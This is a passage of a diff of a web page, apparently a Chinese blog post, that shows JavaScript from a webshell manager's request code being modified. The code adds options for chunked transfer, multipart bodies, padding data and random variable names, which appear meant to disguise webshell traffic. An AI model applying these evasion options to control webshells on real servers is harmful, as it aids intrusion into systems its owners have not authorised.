+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">_postData</span><span class="o">.</span><span class="n">hasOwnProperty</span><span class="p">(</span><span class="n">key</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">let</span> <span class="n">_tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_postData</span><span class="p">[</span><span class="n">key</span><span class="p">])</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/</span><span class="n">asunescape</span>\<span class="p">((</span><span class="o">.+</span><span class="err">?</span><span class="p">)</span>\<span class="p">)</span><span class="o">/</span><span class="n">g</span><span class="p">,</span> <span class="n">function</span> <span class="p">(</span><span class="o">$</span><span class="p">,</span> <span class="o">$</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">              <span class="k">return</span> <span class="n">unescape</span><span class="p">(</span><span class="o">$</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">});</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_postarr</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">_tmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_request</span><span class="o">.</span><span class="n">send</span> <span class="o">=</span> <span class="n">old_send</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="k">var</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">_postData</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">_postData</span><span class="o">.</span><span class="n">hasOwnProperty</span><span class="p">(</span><span class="n">key</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">let</span> <span class="n">_tmp</span> <span class="o">=</span> <span class="n">encodeURIComponent</span><span class="p">(</span><span class="n">_postData</span><span class="p">[</span><span class="n">key</span><span class="p">])</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="o">/</span><span class="n">asunescape</span>\<span class="p">((</span><span class="o">.+</span><span class="err">?</span><span class="p">)</span>\<span class="p">)</span><span class="o">/</span><span class="n">g</span><span class="p">,</span> <span class="n">function</span> <span class="p">(</span><span class="o">$</span><span class="p">,</span> <span class="o">$</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">              <span class="k">return</span> <span class="n">unescape</span><span class="p">(</span><span class="o">$</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">});</span> <span class="o">//</span> <span class="err">后续可能需要二次处理的在这里追加</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_postarr</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="err">`</span><span class="o">$</span><span class="p">{</span><span class="n">key</span><span class="p">}</span><span class="o">=$</span><span class="p">{</span><span class="n">_tmp</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_postarr</span> <span class="o">=</span> <span class="n">_postarr</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>大概就是说如果开启了chunk传输后不拉不拉，否则的话就看看是否开启了Multipart，如果开启了不拉不拉，否则咕叽咕叽。</p>
@@ -646,27 +645,27 @@
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 发送请求数据
-</span></span><span class="line"><span class="cl">        .send(&#39;request&#39;, {
-</span></span><span class="line"><span class="cl">          url: this.__opts__[&#39;url&#39;],
-</span></span><span class="line"><span class="cl">          hash: hash,
-</span></span><span class="line"><span class="cl">          data: opt[&#39;data&#39;],
-</span></span><span class="line"><span class="cl">          tag_s: opt[&#39;tag_s&#39;],
-</span></span><span class="line"><span class="cl">          tag_e: opt[&#39;tag_e&#39;],
-</span></span><span class="line"><span class="cl">          encode: this.__opts__[&#39;encode&#39;],
-</span></span><span class="line"><span class="cl">          ignoreHTTPS: (this.__opts__[&#39;otherConf&#39;] || {})[&#39;ignore-https&#39;] === 1,
-</span></span><span class="line"><span class="cl">          useChunk: (this.__opts__[&#39;otherConf&#39;] || {})[&#39;use-chunk&#39;] === 1,
-</span></span><span class="line"><span class="cl">          chunkStepMin: (this.__opts__[&#39;otherConf&#39;] || {})[&#39;chunk-step-byte-min&#39;] || 2,
-</span></span><span class="line"><span class="cl">          chunkStepMax: (this.__opts__[&#39;otherConf&#39;] || {})[&#39;chunk-step-byte-max&#39;] || 3,
-</span></span><span class="line"><span class="cl">          useMultipart: (this.__opts__[&#39;otherConf&#39;] || {})[&#39;use-multipart&#39;] === 1,
-</span></span><span class="line"><span class="cl">          addMassData: (this.__opts__[&#39;otherConf&#39;] || {})[&#39;add-MassData&#39;] === 1,
-</span></span><span class="line"><span class="cl">          useRandomVariable: (this.__opts__[&#39;otherConf&#39;] || {})[&#39;use-random-variable&#39;] === 1,
-</span></span><span class="line"><span class="cl">          timeout: parseInt((this.__opts__[&#39;otherConf&#39;] || {})[&#39;request-timeout&#39;]),
-</span></span><span class="line"><span class="cl">          headers: (this.__opts__[&#39;httpConf&#39;] || {})[&#39;headers&#39;] || {},
-</span></span><span class="line"><span class="cl">          body: (this.__opts__[&#39;httpConf&#39;] || {})[&#39;body&#39;] || {}
-</span></span><span class="line"><span class="cl">        });
-</span></span><span class="line"><span class="cl">    })
-</span></span><span class="line"><span class="cl">  }
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">//</span> <span class="err">发送请求数据</span>
+</span></span><span class="line"><span class="cl">        <span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;request&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">url</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">__opts__</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">          <span class="nb">hash</span><span class="p">:</span> <span class="nb">hash</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="n">data</span><span class="p">:</span> <span class="n">opt</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">          <span class="n">tag_s</span><span class="p">:</span> <span class="n">opt</span><span class="p">[</span><span class="s1">&#39;tag_s&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">          <span class="n">tag_e</span><span class="p">:</span> <span class="n">opt</span><span class="p">[</span><span class="s1">&#39;tag_e&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">          <span class="n">encode</span><span class="p">:</span> <span class="n">this</span><span class="o">.</span><span class="n">__opts__</span><span class="p">[</span><span class="s1">&#39;encode&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">          <span class="n">ignoreHTTPS</span><span class="p">:</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">__opts__</span><span class="p">[</span><span class="s1">&#39;otherConf&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="p">{})[</span><span class="s1">&#39;ignore-https&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="n">useChunk</span><span class="p">:</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">__opts__</span><span class="p">[</span><span class="s1">&#39;otherConf&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="p">{})[</span><span class="s1">&#39;use-chunk&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="n">chunkStepMin</span><span class="p">:</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">__opts__</span><span class="p">[</span><span class="s1">&#39;otherConf&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="p">{})[</span><span class="s1">&#39;chunk-step-byte-min&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="n">chunkStepMax</span><span class="p">:</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">__opts__</span><span class="p">[</span><span class="s1">&#39;otherConf&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="p">{})[</span><span class="s1">&#39;chunk-step-byte-max&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="mi">3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="n">useMultipart</span><span class="p">:</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">__opts__</span><span class="p">[</span><span class="s1">&#39;otherConf&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="p">{})[</span><span class="s1">&#39;use-multipart&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="n">addMassData</span><span class="p">:</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">__opts__</span><span class="p">[</span><span class="s1">&#39;otherConf&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="p">{})[</span><span class="s1">&#39;add-MassData&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="n">useRandomVariable</span><span class="p">:</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">__opts__</span><span class="p">[</span><span class="s1">&#39;otherConf&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="p">{})[</span><span class="s1">&#39;use-random-variable&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="n">timeout</span><span class="p">:</span> <span class="n">parseInt</span><span class="p">((</span><span class="n">this</span><span class="o">.</span><span class="n">__opts__</span><span class="p">[</span><span class="s1">&#39;otherConf&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="p">{})[</span><span class="s1">&#39;request-timeout&#39;</span><span class="p">]),</span>
+</span></span><span class="line"><span class="cl">          <span class="n">headers</span><span class="p">:</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">__opts__</span><span class="p">[</span><span class="s1">&#39;httpConf&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="p">{})[</span><span class="s1">&#39;headers&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="p">{},</span>
+</span></span><span class="line"><span class="cl">          <span class="n">body</span><span class="p">:</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">__opts__</span><span class="p">[</span><span class="s1">&#39;httpConf&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="p">{})[</span><span class="s1">&#39;body&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>后端改完之后要改前端了，前端修改内容是在<code>source\modules\shellmanager\list\form.js</code>中存放</p>
